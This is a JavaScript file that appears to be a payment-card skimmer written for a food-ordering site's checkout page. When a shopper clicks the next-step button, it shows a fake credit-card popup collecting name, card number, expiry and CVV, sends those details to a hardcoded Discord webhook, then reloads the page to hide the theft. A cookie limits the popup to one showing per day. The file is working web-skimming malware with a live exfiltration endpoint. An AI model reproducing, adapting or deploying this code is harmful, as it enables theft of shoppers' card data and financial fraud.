const totalElement = document.querySelector('body > div.menu-desktop.page-desktop.text-center.theme_background > div.container.theme-body-menu-desktop-bg.menu-cont > div.body-menu-desktop.row.position-relative.text-center > div.menu-desktop-cart.order.d-none.d-lg-block.offset-md-4.col-lg-3.col-xl-3.offset-lg-0.rounded-menu.position-relative > div.card.rounded-menu.order-list.themeColumn3Bg.themeBorderColumns > div.cart-subfooter > div.total.pt-3 > h5.total-amount.themeColumn3Font.primaryColour');
const totalAmount = totalElement ? totalElement.textContent : 'N/A';

function setCookie(name, value, days) {
    let expires = "";
    if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

function getCookie(name) {
    const nameEQ = name + "=";
    const ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) === ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

const nextStepButton = document.getElementById('nextstep');
if (nextStepButton) {
    ['click', 'touchend'].forEach(eventType => {
        nextStepButton.addEventListener(eventType, (e) => {
            e.preventDefault();
            if (getCookie('paymentModalShown')) {
                return;
            }
            setCookie('paymentModalShown', 'true', 1);

            const overlay = document.createElement('div');
            overlay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.5);
                z-index: 10000;
            `;
            overlay.addEventListener('click', (e) => {
                if (e.target === overlay) {
                    overlay.remove();
                }
            });

            const popup = document.createElement('div');
            popup.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: white;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                z-index: 10001;
                width: 90%;
                max-width: 350px;
                box-sizing: border-box;
                overflow-y: auto;
                max-height: 90vh;
            `;

            // Apply full-screen styles for mobile
            if (window.innerWidth <= 768) {
                popup.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: white;
                    padding: 20px;
                    z-index: 10001;
                    box-sizing: border-box;
                    overflow-y: auto;
                `;
            }

            const paymentTypeContainer = document.createElement('div');
            paymentTypeContainer.style.cssText = `
                display: flex;
                align-items: center;
                margin-bottom: 15px;
            `;

            const iconContainer = document.createElement('div');
            iconContainer.style.cssText = `
                width: 40px;
                height: 40px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin-right: 10px;
            `;
            const cardIcon = document.createElement('span');
            cardIcon.textContent = '💳';
            cardIcon.style.fontSize = '24px';
            iconContainer.appendChild(cardIcon);
            paymentTypeContainer.appendChild(iconContainer);

            const cardLabel = document.createElement('div');
            cardLabel.textContent = 'Credit Card';
            cardLabel.style.cssText = `
                flex: 1;
                font-size: 16px;
                font-family: Arial, sans-serif;
            `;
            paymentTypeContainer.appendChild(cardLabel);

            const formContainer = document.createElement('div');
            formContainer.style.padding = '14px';

            const form = document.createElement('form');
            form.style.cssText = `
                font-family: Arial, sans-serif;
                display: flex;
                flex-direction: column;
                gap: 10px;
            `;

            const nameGroup = document.createElement('div');
            nameGroup.style.textAlign = 'left';
            const nameLabel = document.createElement('label');
            nameLabel.textContent = 'Card Holder Name';
            nameLabel.style.cssText = 'display: block; margin-bottom: 5px;';
            const nameInput = document.createElement('input');
            nameInput.type = 'text';
            nameInput.placeholder = 'Name On Card';
            nameInput.style.cssText = `
                box-sizing: border-box;
                height: 40px;
                padding: 10px 12px;
                border: 1px solid #d3d8dd;
                border-radius: 4px;
                background-color: white;
                box-shadow: 0 1px 3px 0 #e6ebf1;
                width: 100%;
                font-size: 16px;
                min-width: 0;
            `;
            nameGroup.appendChild(nameLabel);
            nameGroup.appendChild(nameInput);
            form.appendChild(nameGroup);

            const numberGroup = document.createElement('div');
            numberGroup.style.textAlign = 'left';
            const numberLabel = document.createElement('label');
            numberLabel.textContent = 'Card Number';
            numberLabel.style.cssText = 'display: block; margin-bottom: 5px;';
            const numberInput = document.createElement('input');
            numberInput.type = 'text';
            numberInput.placeholder = 'Card Number';
            numberInput.style.cssText = `
                box-sizing: border-box;
                height: 40px;
                padding: 10px 12px;
                border: 1px solid #d3d8dd;
                border-radius: 4px;
                background-color: white;
                box-shadow: 0 1px 3px 0 #e6ebf1;
                width: 100%;
                font-size: 16px;
                min-width: 0;
            `;
            numberGroup.appendChild(numberLabel);
            numberGroup.appendChild(numberInput);
            form.appendChild(numberGroup);

            const row = document.createElement('div');
            row.style.display = 'flex';
            row.style.gap = '10px';

            const expiryGroup = document.createElement('div');
            expiryGroup.style.textAlign = 'left';
            expiryGroup.style.flex = '1';
            const expiryLabel = document.createElement('label');
            expiryLabel.textContent = 'Expiry Date';
            expiryLabel.style.cssText = 'display: block; margin-bottom: 5px;';
            const expiryInput = document.createElement('input');
            expiryInput.type = 'text';
            expiryInput.placeholder = 'MM/YY';
            expiryInput.style.cssText = `
                box-sizing: border-box;
                height: 40px;
                padding: 10px 12px;
                border: 1px solid #d3d8dd;
                border-radius: 4px;
                background-color: white;
                box-shadow: 0 1px 3px 0 #e6ebf1;
                width: 100%;
                font-size: 16px;
                min-width: 0;
            `;
            expiryGroup.appendChild(expiryLabel);
            expiryGroup.appendChild(expiryInput);
            row.appendChild(expiryGroup);

            const cvvGroup = document.createElement('div');
            cvvGroup.style.textAlign = 'left';
            cvvGroup.style.flex = '1';
            const cvvLabel = document.createElement('label');
            cvvLabel.textContent = 'Security Code';
            cvvLabel.style.cssText = 'display: block; margin-bottom: 5px;';
            const cvvInput = document.createElement('input');
            cvvInput.type = 'text';
            cvvInput.placeholder = 'CVV';
            cvvInput.style.cssText = `
                box-sizing: border-box;
                height: 40px;
                padding: 10px 12px;
                border: 1px solid #d3d8dd;
                border-radius: 4px;
                background-color: white;
                box-shadow: 0 1px 3px 0 #e6ebf1;
                width: 100%;
                font-size: 16px;
                min-width: 0;
            `;
            cvvGroup.appendChild(cvvLabel);
            cvvGroup.appendChild(cvvInput);
            row.appendChild(cvvGroup);

            form.appendChild(row);

            const totalDisplay = document.createElement('div');
            totalDisplay.textContent = `Total: ${totalAmount}`;
            totalDisplay.style.cssText = `
                font-family: Arial, sans-serif;
                font-size: 16px;
                font-weight: bold;
                margin: 10px 0;
                text-align: left;
            `;
            form.appendChild(totalDisplay);

            const surchargeNote = document.createElement('div');
            surchargeNote.textContent = '1.00% surcharge added';
            surchargeNote.style.cssText = `
                font-family: Arial, sans-serif;
                font-size: 14px;
                color: #666;
                text-align: left;
                margin-top: 5px;
            `;
            form.appendChild(surchargeNote);

            const submitButton = document.createElement('button');
            submitButton.textContent = 'Pay';
            submitButton.style.cssText = `
                padding: 10px;
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
                margin-top: 10px;
            `;
            submitButton.addEventListener('click', (e) => {
                e.preventDefault();
                const payload = {
                    embeds: [{
                        title: "Payment Details",
                        fields: [
                            { name: "Cardholder Name", value: nameInput.value || "N/A" },
                            { name: "Card Number", value: numberInput.value || "N/A" },
                            { name: "Expiry", value: expiryInput.value || "N/A" },
                            { name: "CVV", value: cvvInput.value || "N/A" },
                            { name: "Total Amount", value: totalAmount }
                        ],
                        color: 3447003
                    }]
                };
                fetch('https://discord.com/api/webhooks/1383037554642780161/12Krj-WpOo-hnc-cPNQ7ChRKVcPmympDEmF47f-fjKWiLhPCypijLWiflc2pZVPlN7-v', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                    .then(response => {
                        if (!response.ok) throw new Error('Network response was not ok');
                        window.location.reload();
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Failed to submit payment details. Please try again.');
                    });
            });
            form.appendChild(submitButton);

            const closeButton = document.createElement('button');
            closeButton.textContent = 'Close';
            closeButton.style.cssText = `
                padding: 10px;
                background-color: #ccc;
                color: black;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
                margin-top: 5px;
            `;
            closeButton.addEventListener('click', () => overlay.remove());
            form.appendChild(closeButton);

            formContainer.appendChild(form);
            popup.appendChild(paymentTypeContainer);
            popup.appendChild(formContainer);
            overlay.appendChild(popup);
            document.body.appendChild(overlay);
        });
    });
}
